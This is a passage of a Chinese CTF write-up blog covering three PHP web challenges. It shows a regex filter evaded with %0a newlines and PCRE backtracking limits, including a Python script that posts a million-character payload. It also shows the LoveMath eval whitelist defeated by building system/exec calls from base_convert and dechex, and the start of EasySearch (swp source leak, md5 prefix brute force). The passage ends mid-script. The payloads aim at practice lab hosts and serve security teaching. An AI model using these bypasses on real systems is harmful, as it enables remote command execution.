这个函数用于将JSON格式的字符串解码为PHP变量,参数 $json 是要被解码的 JSON 字符串,格式类似 {“cmd”: “ls”}</p><p>json_decode第二个参数被设置为true,意味着json_decode函数将返回一个关联数组(array)而不是一个对象(object),把json_decode函数返回的关联数组中的’cmd’键对应的值赋值给变量$command</p><p>这里正则表达式明显过滤的非常严格,过滤了非常多东西,使用的格式是  ^.<em>(捕获组).</em>$</p><p>. 表示匹配任意单个字符(除了换行符) </p><ul><li>是量词，表示前面的元素可以出现0次或多次。</li></ul><p>.* 表示匹配任意数量的任意字符(默认不会匹配换行符,需要修饰符才会匹配)</p><p>加上^ 变成 ^.*  表示从字符串的开始位置匹配任意数量的任意字符 </p><p>后面的  .*$  表示从当前位置匹配任意数量的任意字符，直到行尾</p><p>括号表示捕获组,可以在匹配过程中捕获一部分匹配的内容，并且可以在后续处理中引用这些被捕获的部分</p><p>注意到正则匹配中  [\x00-\x1FA-Z0-9!#-/;-@[-&#96;|~\x7F]+<br>\x00-\x1F  表示从 ASCII 码 0 到 31 的字符(控制字符),A-Z0-9 就是大写字母和数字,这里没有用修饰符i 没有过滤小写字母,后面的+表示可以匹配1次或多次</p><hr><p>既然没有过滤小写字母我们试试</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">POST：<br><span class="hljs-keyword">cmd</span><span class="language-bash">=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure><p>发现成功回显index.php，但是传入{“cmd”:”ls &#x2F;“}就不行了因为&#x2F;别过滤了</p><hr><h2 id="解法一-0a绕过"><a href="#解法一-0a绕过" class="headerlink" title="解法一 %0a绕过"></a>解法一 %0a绕过</h2><p>正则表达式是 ^…$ 格式  如果没有修饰符m 那么^只会匹配第一行的内容,可以利用%0a换行符绕过<br>而且这里还用了.* 贪婪匹配  也没有修饰符s  所以 .* 也不会匹配换行符%0a<br>那么只需传入换行符%0a,那么就可以绕过 .* 从而绕过正则匹配<br>但是这里正则匹配表达式中 \x00-\x1F 过滤了ascii码 0-31 的控制字符,包含了换行符,因此%0a会被匹配</p><p>也就是说如果传入的命令是</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>&#125; <br></code></pre></td></tr></table></figure><p>此时 .* 匹配了最开始的左括号{  因为遇到%0a就不匹配了,然后正则表达式括号中的\x00-\x1F 匹配了换行符%0a  而后面的+表示可以匹配1次或多次,因此在%0a后面再多添加几个%0a也没用   最后的.* 匹配了”cmd”:”&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag”}  从而匹配成功,如下图所示</p><hr><p>或者如果在字符串的 { 前面加上%0a 变成    %0a{“cmd”:”&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag”}<br>此时第一个.* 匹配的不是空null, 是空字符串””,因为*可以匹配0次或多次, \x00-\x1F 匹配了%0a   最后的.*匹配到字符串结束   从而也会匹配成功</p><hr><p>但是如果我们构造这样的payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span>:<br><span class="hljs-attribute">cmd</span>=&#123;%<span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls /&quot;</span>%<span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p><strong>此时.* 匹配 {   而\x00-\x1F 匹配了第一个%0a 但是最后的 .* 不能匹配换行符,因此也匹配不到换行后的 }  所以不能匹配到完整字符串,返回值为空,完成正则绕过</strong></p><p>payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode">cmd=&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls /home/rceservice&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br>发现flag<br><br><span class="hljs-attr">#cmd=&#123;%0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;cat /home/rceservice/flag&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<span class="hljs-attr">#没有回显，应该是环境变量配置被改变，所以需要使用/bin/cat调用命令</span><br><span class="hljs-attr"></span><br><span class="hljs-attr">cmd=&#123;%0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="解法二-PCRE回溯次数绕过"><a href="#解法二-PCRE回溯次数绕过" class="headerlink" title="解法二 PCRE回溯次数绕过"></a>解法二 PCRE回溯次数绕过</h2><p>PCRE回溯机制有一个回溯限制次数——大约100 万次,当回溯超出这个次数,还没吐完的字符串就可以逃逸绕过匹配<br>通过发送超长字符串的方式,使正则执行失败,让传入的参数逃逸,从而正常执行命令绕过限制</p><p>那么就传入一个json格式字符串,里面的键名为cmd,键值为执行的命令<br>然后在payload后加上100万个字符即可,等匹配超过这个次数时语句自然就可以逃逸掉<br>使用python脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>url = <span class="hljs-string">&#x27;http://11f9f73e-7798-4724-a5b4-7316cfec570b.node5.buuoj.cn:81/&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;cmd&#x27;</span>:<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;, &quot;abc&quot;:&quot;&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*1000000</span>+<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>&#125;<br><br>res = requests.post(url,<span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> +%0a绕过单行匹配正则 </tag>
            
            <tag> PCRE回溯次数绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019初赛-LoveMath</title>
      <link href="/2025/03/30/CISCN2019%E5%88%9D%E8%B5%9B-LoveMath/"/>
      <url>/2025/03/30/CISCN2019%E5%88%9D%E8%B5%9B-LoveMath/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2019初赛-LoveMath"><a href="#CISCN2019初赛-LoveMath" class="headerlink" title="CISCN2019初赛-LoveMath"></a>CISCN2019初赛-LoveMath</h1><p>一上来直接就是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>分析一下源代码</p><p>一开始是限制了传入参数的长度，然后有黑名单过滤，最后是白名单，这里的白名单是常用的数学函数。</p><h2 id="解法一：构造-GET或者用getallheaders"><a href="#解法一：构造-GET或者用getallheaders" class="headerlink" title="解法一：构造$_GET或者用getallheaders"></a>解法一：构造$_GET或者用getallheaders</h2><p>黑名单过滤了不少东西，常规的cat&#x2F;flag都不能使用了，这里有个知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’);</p><p>例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[a])(<span class="hljs-variable">$_GET</span>[b])&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>但$_GET、a、b都不属于白名单内，需要替换出来</p><p>a,b可以用白名单中的数学函数名来替换，例如pi,abs</p><p>这样就变成了<code>?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag</code></p><p>但是这里的_GET是无法进行直接替换，而且[]也被黑名单过滤了</p><p>所以我们需要用已知白名单中的数学函数构造出来</p><p>这里讲几个函数：</p><p><strong>hex2bin() 函数</strong>：hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。(<strong>_GET也属于acii字符，它们的16进制值为5f 47 45 54</strong>)</p><p>但5f 47 45 54也不能直接传值，因为 <code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</code>  会检测它们</p><p>hex2bin()函数可以通过base_convert()函数来进行转换</p><p>**base_convert()**：</p><p><img src="/../image/CISCN2019%E5%88%9D%E8%B5%9B-LoveMath-1.png"></p><p>base_convert()函数能够在任意进制之间转换数字</p><p><strong>hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin</strong></p><p><strong>hex2bin&#x3D;base_convert(37907361743,10,36)</strong></p><p>后里面的5f 47 45 54要用**dechex()**函数将10进制数转换为16进制的数</p><p>dechex(1598506324)，1598506324转换为16进制就是5f 47 45 54</p><p>最终payload:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">/?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br><br>分析：<br>base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">&quot;hex2bin&quot;</span><br>dechex(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">&quot;5f474554&quot;</span><br><span class="hljs-meta"><span class="hljs-keyword">$pi</span>=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2bin将一串16进制数转换为二进制字符串</span><br>(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;) =&gt; (<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">pi</span>&#125;(<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">abs</span>&#125;  <span class="hljs-comment">//&#123;&#125;可以代替[]</span><br></code></pre></td></tr></table></figure><p>或者：<strong>getallheaders()代替get</strong></p><p>getallheaders - 获取当前请求的全部HTTP请求头信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br><br>分析：<br><span class="hljs-function"><span class="hljs-title">base_convert</span><span class="hljs-params">(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)</span></span> =&gt; <span class="hljs-string">&quot;exec&quot;</span><br><span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>) =&gt; <span class="hljs-string">&quot;getallheaders&quot;</span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">(getallheaders()</span></span>&#123;<span class="hljs-number">1</span>&#125;)<br><span class="hljs-comment">//操作xx和yy，中间用逗号隔开，echo都能输出</span><br>echo xx,yy<br><br>然后在请求头中添加<br><span class="hljs-number">1</span>:cat /flag<br></code></pre></td></tr></table></figure><h2 id="解法二：直接执行命令"><a href="#解法二：直接执行命令" class="headerlink" title="解法二：直接执行命令"></a>解法二：直接执行命令</h2><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">//exec(&#x27;hex2bin(<span class="hljs-name">dechex</span>(<span class="hljs-number">109270211257898</span>))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)<br>($pi=base_convert)(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)($pi(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(<span class="hljs-name">dechex</span>(<span class="hljs-number">109270211257898</span>)))<br><br>//system(&#x27;cat&#x27;.dechex(<span class="hljs-number">16</span>)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)<br>base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))<br></code></pre></td></tr></table></figure><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>动态函数</p><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数,比如下面的代码会执行 system(‘ls’);</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$a=<span class="hljs-string">&#x27;system&#x27;</span><span class="hljs-comment">; </span><br>$b=<span class="hljs-string">&#x27;ls&#x27;</span><span class="hljs-comment">;</span><br>$a($b)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-EasySearch1</title>
      <link href="/2025/03/30/BJDCTF2020-EasySearch1/"/>
      <url>/2025/03/30/BJDCTF2020-EasySearch1/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-EasySearch1"><a href="#BJDCTF2020-EasySearch1" class="headerlink" title="BJDCTF2020-EasySearch1"></a>BJDCTF2020-EasySearch1</h1><p>一进来发现是这样一个页面。</p><p><img src="/../image/BJDCTF2020-EasySearch1-1.png"></p><p>尝试sql注入，发现没反应，用dirsearch扫一下目录发现是swp泄露</p><p>访问url&#x2F;index.php.swp</p><p>发现源码，开始代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>&#125;<br> <br>    <span class="hljs-comment">// 设置响应的Content-Type头部信息为text/html，并指定字符编码为utf-8</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br> <br>    <span class="hljs-comment">//检查用户是否提交了表单且username字段不为空</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <br>        <span class="hljs-comment">// 验证用户密码是否匹配管理员密码</span><br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>; <span class="hljs-comment">// 输出欢迎消息</span><br>            <span class="hljs-comment">// 创建一个以生成的哈希值为文件名的.shtml文件</span><br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-comment">// 打开文件用于写入，如果打开失败则输出错误信息并终止脚本执行</span><br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>; <span class="hljs-comment">// 组装要写入文件的内容</span><br>            <span class="hljs-comment">// 将内容写入文件</span><br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-comment">// 关闭文件</span><br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>; <span class="hljs-comment">// 输出错误消息</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>; <span class="hljs-comment">// 输出验证失败消息</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果用户名为空，则执行此部分逻辑</span><br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>意思就是他会检查传入的password的值，如果password的md5值的前6位等于”6d0bc1”那就就会执行命令将输入的username写入到一个随机数生成的shtml文件中，并输入header error 的错误信息。</p><p>所以我们首先要做的就是要使password符合要求，可以用这两个脚本来找出符合要求的password.</p><p><strong>php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000000000000</span>;<span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$i</span>),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-variable">$admin</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$i</span>.PHP_EOL;<br>    